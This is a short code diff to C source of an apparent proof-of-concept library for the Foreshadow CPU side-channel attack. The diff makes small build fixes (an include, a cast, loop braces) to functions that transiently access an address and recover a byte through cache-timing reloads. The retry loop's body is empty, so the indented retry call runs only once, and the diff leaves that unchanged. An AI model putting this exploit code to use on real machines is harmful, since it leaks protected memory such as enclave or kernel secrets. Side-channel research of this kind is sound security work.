@@ -24,6 +24,7 @@
 #include "rtm.h"
 #include "debug.h"
 
+#include <stdint.h>
 #include <stdio.h>
 #include <sys/reg.h>
 #include <sys/mman.h>
@@ -91,7 +92,7 @@ static inline int __attribute__((always_inline)) foreshadow_round(void *adrs)
      * NOTE: proof-of-concept only: calling application should catch exception
      * and properly restore access rights.
      */
-    transient_access(fs_oracle, adrs, SLOT_SIZE);
+    transient_access((uint8_t *)fs_oracle, adrs, SLOT_SIZE);
 
     for (i=0; i < NUM_SLOTS; i++)
         if (reload( SLOT_OFFSET( fs_oracle, i ) ) < fs_reload_threshold)
@@ -109,7 +110,7 @@ int foreshadow(void *adrs)
         foreshadow_init();
 
     /* Be sceptic about 0x00 bytes to compensate for the bias */
-    for(j=0; (rv==0x00 || rv==0xff) && j < FORESHADOW_ZERO_RETRIES; j++, fs_zero_retries++);
+    for(j=0; (rv==0x00 || rv==0xff) && j < FORESHADOW_ZERO_RETRIES; j++, fs_zero_retries++){}
         rv = foreshadow_round(adrs);
 
     return rv;
